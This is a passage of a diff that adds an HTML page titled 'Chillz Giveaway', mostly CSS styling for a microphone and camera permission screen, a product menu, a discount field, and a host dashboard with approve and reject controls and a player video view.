@@ -1,0 +1,4173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>✦ Chillz Giveaway</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+        :root {
+            --neon-green: #00ff88;
+            --neon-blue: #00ccff;
+            --neon-pink: #ff00aa;
+            --neon-yellow: #ffe600;
+            --cyber-bg: #0a0a14;
+            --glass-bg: rgba(10, 10, 20, 0.78);
+            --text-primary: #e0e0ff;
+            --text-dim: #8888aa;
+            --red-alert: #ff2244;
+        }
+
+        body {
+            background: var(--cyber-bg);
+            color: var(--text-primary);
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            background-image: radial-gradient(ellipse at 50% 0%, rgba(0, 255, 136, 0.03) 0%, transparent 70%);
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 820px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        /* ----- SCREENS ----- */
+        .screen {
+            display: none;
+            width: 100%;
+            min-height: 90vh;
+            padding: 20px 16px 40px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.5s ease;
+            position: relative;
+        }
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* ----- GLASS CARD ----- */
+        .glass {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 255, 136, 0.10);
+            border-radius: 32px;
+            padding: 32px 28px;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.05), inset 0 0 60px rgba(0, 255, 136, 0.01);
+            width: 100%;
+            max-width: 600px;
+            transition: all 0.3s;
+        }
+        .glass-wide {
+            max-width: 780px;
+        }
+
+        /* ----- TYPOGRAPHY ----- */
+        .title-glow {
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            font-size: clamp(1.8rem, 6vw, 3.4rem);
+            background: linear-gradient(135deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 60px rgba(0, 255, 136, 0.15);
+            letter-spacing: 3px;
+            text-align: center;
+        }
+        .sub-glow {
+            font-size: clamp(0.9rem, 2vw, 1.3rem);
+            color: var(--text-dim);
+            font-weight: 400;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            text-align: center;
+        }
+        .cyber-text {
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        /* ----- PERMISSION ----- */
+        #permissionStatus {
+            margin-top: 18px;
+            font-weight: 600;
+            font-size: 1.05rem;
+            padding: 12px 20px;
+            border-radius: 16px;
+            text-align: center;
+            width: 100%;
+        }
+        .perm-granted {
+            color: var(--neon-green);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.05);
+        }
+        .perm-denied {
+            color: #ff4466;
+            border: 1px solid rgba(255, 68, 102, 0.25);
+            background: rgba(255, 68, 102, 0.07);
+            animation: pulseRed 1.4s infinite;
+        }
+        @keyframes pulseRed {
+            0%,
+            100% {
+                box-shadow: 0 0 10px rgba(255, 68, 102, 0.1);
+            }
+            50% {
+                box-shadow: 0 0 28px rgba(255, 68, 102, 0.25);
+            }
+        }
+
+        /* ----- VOICE INDICATOR ----- */
+        .voice-ring {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 255, 136, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+            position: relative;
+            transition: all 0.3s;
+            background: rgba(0, 255, 136, 0.03);
+        }
+        .voice-ring.active {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.15);
+            animation: pulseRing 1.2s infinite;
+        }
+        @keyframes pulseRing {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.04);
+            }
+        }
+        .voice-ring .mic-icon {
+            font-size: 2.6rem;
+            opacity: 0.6;
+            transition: 0.3s;
+        }
+        .voice-ring.active .mic-icon {
+            opacity: 1;
+            color: var(--neon-green);
+        }
+        .voice-ring .wave-bars {
+            position: absolute;
+            inset: -10px;
+            border-radius: 50%;
+            border: 1px solid rgba(0, 255, 136, 0.05);
+            animation: spinWave 8s linear infinite;
+        }
+        @keyframes spinWave {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ----- CHILLZ LOGO ----- */
+        .chillz-container {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+        }
+        .chillz-logo {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, rgba(0, 255, 136, 0.15), rgba(0, 204, 255, 0.05));
+            border: 2px solid rgba(0, 255, 136, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            font-size: 2.8rem;
+            color: var(--neon-green);
+            text-shadow: 0 0 60px rgba(0, 255, 136, 0.3);
+            box-shadow: 0 0 80px rgba(0, 255, 136, 0.05);
+            position: relative;
+            animation: floatGlow 3s ease-in-out infinite;
+            user-select: none;
+        }
+        .chillz-logo img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .chillz-logo::after {
+            content: '';
+            position: absolute;
+            inset: -8px;
+            border-radius: 50%;
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            animation: spinRing 6s linear infinite;
+        }
+        @keyframes floatGlow {
+            0%,
+            100% {
+                transform: translateY(0px) scale(1);
+                box-shadow: 0 0 80px rgba(0, 255, 136, 0.05);
+            }
+            50% {
+                transform: translateY(-8px) scale(1.02);
+                box-shadow: 0 0 120px rgba(0, 255, 136, 0.12);
+            }
+        }
+        @keyframes spinRing {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .chillz-text {
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: clamp(1.8rem, 5vw, 2.8rem);
+            background: linear-gradient(135deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-top: 12px;
+            letter-spacing: 4px;
+            text-shadow: 0 0 60px rgba(0, 255, 136, 0.1);
+        }
+
+        /* ----- MENU BUTTONS ----- */
+        .menu-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            width: 100%;
+            margin-top: 12px;
+        }
+        .menu-btn {
+            position: relative;
+            padding: 18px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(4px);
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: clamp(1rem, 2.5vw, 1.4rem);
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
+            gap: 12px;
+        }
+        .menu-btn .btn-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: clamp(0.9rem, 2vw, 1.2rem);
+        }
+        .menu-btn .btn-left .btn-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            object-fit: cover;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            flex-shrink: 0;
+        }
+        .menu-btn .badge {
+            font-size: 0.6rem;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .menu-btn .stock {
+            font-size: 0.65rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            padding: 3px 12px;
+            border-radius: 30px;
+            background: rgba(255, 0, 0, 0.08);
+            color: #ff4466;
+        }
+        .menu-btn .stock.green {
+            background: rgba(0, 255, 136, 0.08);
+            color: var(--neon-green);
+        }
+
+        .btn-harvester {
+            border-color: rgba(0, 100, 50, 0.4);
+            background: rgba(0, 80, 40, 0.2);
+        }
+        .btn-harvester:hover {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.08);
+            transform: translateY(-2px);
+        }
+        .btn-harvester .badge {
+            background: rgba(0, 255, 136, 0.12);
+            color: var(--neon-green);
+        }
+
+        .btn-sweet {
+            border-color: rgba(255, 0, 170, 0.2);
+            background: rgba(255, 0, 170, 0.06);
+        }
+        .btn-sweet:hover {
+            border-color: var(--neon-pink);
+            box-shadow: 0 0 40px rgba(255, 0, 170, 0.08);
+            transform: translateY(-2px);
+        }
+        .btn-sweet .badge {
+            background: rgba(255, 230, 0, 0.12);
+            color: var(--neon-yellow);
+        }
+
+        .btn-ginger {
+            border-color: rgba(180, 150, 120, 0.3);
+            background: rgba(120, 90, 60, 0.12);
+            position: relative;
+            overflow: visible;
+        }
+        .btn-ginger:hover {
+            border-color: #d4a574;
+            box-shadow: 0 0 40px rgba(180, 150, 120, 0.08);
+            transform: translateY(-2px);
+        }
+        .btn-ginger .badge {
+            background: rgba(255, 50, 50, 0.15);
+            color: #ff5555;
+        }
+        .btn-ginger::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 24px;
+            background: transparent;
+            border: 2px solid rgba(180, 150, 120, 0.15);
+            animation: gingerGlow 2s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes gingerGlow {
+            0%,
+            100% {
+                box-shadow: 0 0 15px rgba(180, 150, 120, 0.05), 0 0 30px rgba(180, 150, 120, 0.02);
+                border-color: rgba(180, 150, 120, 0.15);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(180, 150, 120, 0.15), 0 0 80px rgba(180, 150, 120, 0.05);
+                border-color: rgba(180, 150, 120, 0.4);
+            }
+        }
+
+        .menu-btn .right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0;
+            flex-wrap: wrap;
+        }
+
+        /* ----- DISCOUNT CODE ----- */
+        .discount-area {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .discount-area label {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--text-dim);
+        }
+        .discount-row {
+            display: flex;
+            gap: 10px;
+        }
+        .discount-row input {
+            flex: 1;
+            padding: 12px 18px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            color: #fff;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            letter-spacing: 1px;
+        }
+        .discount-row input:focus {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+        .discount-row input::placeholder {
+            color: #555577;
+        }
+        .discount-row button {
+            padding: 12px 28px;
+            border-radius: 16px;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            background: rgba(0, 255, 136, 0.04);
+            color: var(--neon-green);
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .discount-row button:hover {
+            background: rgba(0, 255, 136, 0.08);
+            border-color: var(--neon-green);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+        }
+        .discount-msg {
+            font-size: 0.85rem;
+            color: var(--text-dim);
+            min-height: 24px;
+            padding: 4px 0;
+        }
+
+        /* ----- MENU HIDDEN IN BOSS MODE ----- */
+        .menu-hidden {
+            display: none !important;
+        }
+
+        /* ----- BOSS DASHBOARD ----- */
+        #bossDashboard {
+            display: none;
+            width: 100%;
+            max-width: 820px;
+            padding: 16px 14px;
+            background: radial-gradient(ellipse at 30% 20%, #0d1a2b, #060a12);
+            border-radius: 32px;
+            border: 1px solid rgba(0, 245, 192, 0.06);
+            box-shadow: inset 0 0 80px rgba(0, 245, 192, 0.02);
+            margin: 0 auto;
+        }
+        #bossDashboard.active {
+            display: block;
+        }
+
+        .boss-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .boss-header .title {
+            font-family: 'Orbitron', monospace;
+            font-weight: 700;
+            font-size: 1.1rem;
+            background: linear-gradient(135deg, #ffd93d, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.02em;
+        }
+        .boss-header .status {
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 0.05em;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 3px 12px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .boss-header .status .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .boss-header .status .dot.online {
+            background: #00f5c0;
+            animation: pulseHold 0.8s ease-in-out infinite alternate;
+        }
+        .boss-header .status .dot.offline {
+            background: #556;
+        }
+        @keyframes pulseHold {
+            0% {
+                opacity: 0.6;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1.02);
+            }
+        }
+
+        .boss-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        @media (max-width:700px) {
+            .boss-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .boss-left {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            min-height: 0;
+        }
+
+        .boss-code-section {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            padding: 10px 14px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            flex-shrink: 0;
+        }
+        .boss-code-section .code-label {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            margin-bottom: 2px;
+        }
+        .boss-code-section .code-display {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .boss-code-section .code-display .code-text {
+            font-size: 1.4rem;
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            font-family: 'SF Mono', monospace;
+            color: #00f5c0;
+            text-shadow: 0 0 30px rgba(0, 245, 192, 0.06);
+            flex: 1;
+            min-width: 60px;
+        }
+        .boss-code-section .code-status {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.15);
+            margin-top: 2px;
+            min-height: 14px;
+        }
+        .boss-code-section .code-status.active {
+            color: #6bcbff;
+        }
+        .boss-code-section .code-status.connected {
+            color: #00f5c0;
+        }
+
+        .boss-part-selector {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            padding: 8px 10px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            min-height: 120px;
+            max-height: 180px;
+        }
+        .boss-part-selector .selector-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+            flex-shrink: 0;
+        }
+        .boss-part-selector .selector-header .title {
+            font-size: 0.6rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 0.05em;
+        }
+        .boss-part-selector .selector-header .current-part-label {
+            font-size: 0.55rem;
+            color: #ffd93d;
+            background: rgba(255, 217, 61, 0.08);
+            padding: 2px 10px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 217, 61, 0.1);
+            max-width: 120px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .boss-part-selector .part-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            overflow-y: auto;
+            padding: 4px 0;
+            flex: 1;
+            align-content: flex-start;
+        }
+        .boss-part-selector .part-list::-webkit-scrollbar {
+            width: 3px;
+        }
+        .boss-part-selector .part-list::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+        }
+        .boss-part-selector .part-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            padding: 3px 10px;
+            border-radius: 40px;
+            font-size: 0.55rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.02);
+            -webkit-tap-highlight-color: transparent;
+            white-space: nowrap;
+            flex-shrink: 0;
+            min-height: 22px;
+        }
+        .boss-part-selector .part-item:hover {
+            transform: scale(1.04);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        .boss-part-selector .part-item .dot-color {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+        .boss-part-selector .part-item .dot-color.green {
+            background: #00f5c0;
+        }
+        .boss-part-selector .part-item .dot-color.yellow {
+            background: #ffd93d;
+        }
+        .boss-part-selector .part-item .dot-color.orange {
+            background: #ff9100;
+        }
+        .boss-part-selector .part-item .dot-color.red {
+            background: #ff3d3d;
+        }
+        .boss-part-selector .part-item .part-name {
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 500;
+            font-size: 0.55rem;
+        }
+        .boss-part-selector .part-item .part-points {
+            font-size: 0.4rem;
+            color: rgba(255, 255, 255, 0.12);
+        }
+        .boss-part-selector .part-item.active {
+            border-color: rgba(0, 245, 192, 0.3);
+            background: rgba(0, 245, 192, 0.06);
+        }
+        .boss-part-selector .part-item.active .part-name {
+            color: #00f5c0;
+        }
+
+        .boss-slider-section {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            padding: 8px 12px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            flex-shrink: 0;
+        }
+        .boss-slider-section .slider-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2px;
+        }
+        .boss-slider-section .slider-header .label {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 0.05em;
+        }
+        .boss-slider-section .slider-header .value {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #6bcbff;
+            font-family: 'SF Mono', monospace;
+            min-width: 32px;
+            text-align: right;
+        }
+        .boss-slider-section .slider-header .value.done {
+            color: #00f5c0;
+        }
+        .boss-slider-section input[type="range"] {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 4px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.08);
+            outline: none;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .boss-slider-section input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 245, 192, 0.15);
+            transition: all 0.2s;
+        }
+        .boss-slider-section input[type="range"]::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.25);
+        }
+
+        .boss-player-info {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            padding: 8px 12px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            flex-shrink: 0;
+        }
+        .boss-player-info .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2px 0;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.3);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+        .boss-player-info .info-row:last-child {
+            border-bottom: none;
+        }
+        .boss-player-info .info-row .label {
+            color: rgba(255, 255, 255, 0.12);
+            font-size: 0.45rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .boss-player-info .info-row .value {
+            font-weight: 600;
+            color: #e8edf5;
+            font-size: 0.65rem;
+        }
+        .boss-player-info .info-row .value.timer {
+            color: #ff6b6b;
+            font-family: 'SF Mono', monospace;
+        }
+        .boss-player-info .info-row .value.timer.warning {
+            color: #ffd93d;
+        }
+        .boss-player-info .info-row .value.timer.danger {
+            color: #ff3d3d;
+            animation: pulse 0.6s ease-in-out infinite alternate;
+        }
+        .boss-player-info .info-row .value.part {
+            color: #ffd93d;
+        }
+        .boss-player-info .info-row .value.score {
+            color: #00f5c0;
+        }
+        .boss-player-info .info-row .value.status-text {
+            font-size: 0.55rem;
+            color: #6bcbff;
+        }
+        .boss-player-info .info-row .value.status-text.waiting {
+            color: #8899bb;
+        }
+        .boss-player-info .info-row .value.status-text.approved {
+            color: #00f5c0;
+        }
+        .boss-player-info .info-row .value.status-text.rejected {
+            color: #ff6b6b;
+        }
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 0.4;
+                transform: scale(0.95);
+            }
+        }
+
+        /* ----- BOSS ACTIONS (new layout with 7 buttons) ----- */
+        .boss-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .boss-actions .actions-row {
+            display: flex;
+            gap: 5px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .boss-actions .actions-row button {
+            padding: 5px 10px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.6rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 44px;
+            flex: 1;
+            max-width: 90px;
+            border: none;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+        }
+        .boss-actions .actions-row .btn-host-start {
+            background: linear-gradient(135deg, #ffd93d, #ff9100);
+            color: #0b0e14;
+        }
+        .boss-actions .actions-row .btn-host-start:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 217, 61, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-start:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .boss-actions .actions-row .btn-host-hold {
+            background: linear-gradient(135deg, #ffa94d, #ff6b6b);
+            color: #0b0e14;
+        }
+        .boss-actions .actions-row .btn-host-hold:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 169, 77, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-hold:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .boss-actions .actions-row .btn-host-hold.active {
+            background: #ffa94d;
+            color: #0b0e14;
+            opacity: 1;
+            box-shadow: 0 0 30px rgba(255, 169, 77, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-approve {
+            background: linear-gradient(135deg, #00f5c0, #00c9a0);
+            color: #0b0e14;
+        }
+        .boss-actions .actions-row .btn-host-approve:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-approve:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .boss-actions .actions-row .btn-host-approve.approved {
+            background: #00f5c0;
+            color: #0b0e14;
+            opacity: 1;
+            cursor: default;
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.15);
+        }
+        .boss-actions .actions-row .btn-host-reject {
+            background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
+            color: #fff;
+        }
+        .boss-actions .actions-row .btn-host-reject:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-reject:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .boss-actions .actions-row .btn-host-reject.rejected {
+            background: #ff6b6b;
+            color: #fff;
+            opacity: 1;
+            cursor: default;
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.15);
+        }
+        /* New command buttons */
+        .boss-actions .actions-row .btn-host-command {
+            background: linear-gradient(135deg, #6bcbff, #4a8bd4);
+            color: #fff;
+        }
+        .boss-actions .actions-row .btn-host-command:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(107, 203, 255, 0.2);
+        }
+        .boss-actions .actions-row .btn-host-command:disabled {
+            opacity: 0.2;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .boss-actions .actions-row .btn-host-command.spread {
+            background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
+        }
+        .boss-actions .actions-row .btn-host-command.backup {
+            background: linear-gradient(135deg, #ffd93d, #ff9100);
+            color: #0b0e14;
+        }
+        .boss-actions .actions-row .btn-host-command.zoom {
+            background: linear-gradient(135deg, #00f5c0, #00c9a0);
+            color: #0b0e14;
+        }
+
+        .boss-right {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            min-height: 0;
+        }
+        .boss-video-section {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            aspect-ratio: 9/16;
+            position: relative;
+            min-height: 100px;
+            flex: 1;
+            max-height: 500px;
+        }
+        .boss-video-section video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: none;
+        }
+        .boss-video-section .video-placeholder {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #0a0f15;
+            color: rgba(255, 255, 255, 0.06);
+            pointer-events: none;
+        }
+        .boss-video-section .video-placeholder .icon {
+            font-size: 2rem;
+            margin-bottom: 4px;
+            opacity: 0.3;
+        }
+        .boss-video-section .video-placeholder .text {
+            font-size: 0.7rem;
+            letter-spacing: 0.05em;
+            font-weight: 300;
+        }
+        .boss-video-section .video-placeholder .text .highlight {
+            color: rgba(255, 255, 255, 0.12);
+        }
+        .boss-video-section .video-label {
+            position: absolute;
+            bottom: 6px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(4px);
+            padding: 2px 12px;
+            border-radius: 40px;
+            font-size: 0.45rem;
+            color: rgba(255, 255, 255, 0.12);
+            letter-spacing: 0.05em;
+            pointer-events: none;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+        }
+
+        /* ----- PLAYER GAME VIEW ----- */
+        .player-game-container {
+            width: 100%;
+            max-width: 700px;
+            position: relative;
+            margin: 0 auto;
+        }
+        .player-game-container .glass {
+            max-width: 100%;
+            padding: 16px 14px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 28px;
+        }
+
+        .player-game-row {
+            display: flex;
+            gap: 14px;
+            align-items: stretch;
+        }
+        @media (max-width:600px) {
+            .player-game-row {
+                flex-direction: column;
+            }
+        }
+
+        .player-left-col {
+            flex: 1.2;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .player-right-col {
+            flex: 0.8;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 16px;
+            padding: 12px 14px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        @media (max-width:600px) {
+            .player-right-col {
+                flex: 1;
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                padding: 10px 12px;
+            }
+            .player-right-col .ginger-compact {
+                display: flex;
+                align-items: center;
+                gap: 12px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            .player-right-col .ginger-compact .ginger-icon-small {
+                width: 32px;
+                height: 32px;
+                border-radius: 8px;
+                object-fit: cover;
+            }
+            .player-right-col .ginger-compact .ginger-label-small {
+                font-family: 'Orbitron', monospace;
+                font-size: 0.9rem;
+                font-weight: 700;
+                color: var(--neon-yellow);
+            }
+            .player-right-col .ginger-compact .ginger-pct-small {
+                font-family: 'Orbitron', monospace;
+                font-size: 1.1rem;
+                font-weight: 900;
+                color: var(--neon-green);
+                min-width: 40px;
+                text-align: right;
+            }
+            .player-right-col .ginger-bar-compact {
+                flex: 1;
+                min-width: 60px;
+            }
+            .player-right-col .ginger-bar-compact .bar-track {
+                width: 100%;
+                height: 6px;
+                border-radius: 20px;
+                background: rgba(255, 255, 255, 0.04);
+                overflow: hidden;
+                border: 1px solid rgba(255, 255, 255, 0.03);
+            }
+            .player-right-col .ginger-bar-compact .bar-fill {
+                height: 100%;
+                width: 0%;
+                border-radius: 20px;
+                background: linear-gradient(90deg, #ff4466, var(--neon-yellow), var(--neon-green));
+                transition: width 0.3s ease;
+            }
+            .player-right-col .ginger-bar-compact .bar-label {
+                display: flex;
+                justify-content: space-between;
+                font-size: 0.5rem;
+                color: var(--text-dim);
+                margin-top: 2px;
+                letter-spacing: 1px;
+            }
+        }
+
+        .player-cam-wrapper {
+            position: relative;
+            border-radius: 14px;
